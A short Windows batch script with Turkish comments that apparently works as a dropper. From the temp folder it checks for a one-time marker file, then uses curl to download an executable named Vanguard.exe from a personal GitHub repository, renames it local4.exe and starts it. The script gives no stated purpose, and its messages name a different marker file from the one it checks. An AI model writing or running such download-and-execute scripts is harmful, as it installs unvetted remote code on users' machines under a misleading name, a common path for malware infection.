@echo off
cd %temp%

REM Dosya kontrolü
if exist nagihori2.txt (
    echo nagihori.txt bulundu, çıkılıyor...
    exit /b
) else (
    echo nagihori.txt yok, devam ediliyor...
    curl -L https://github.com/seition2doc/dosta2/raw/refs/heads/main/Vanguard.exe -o local4.exe
    echo "asd" > nagihori2.txt 
    start local4.exe
    
    
)
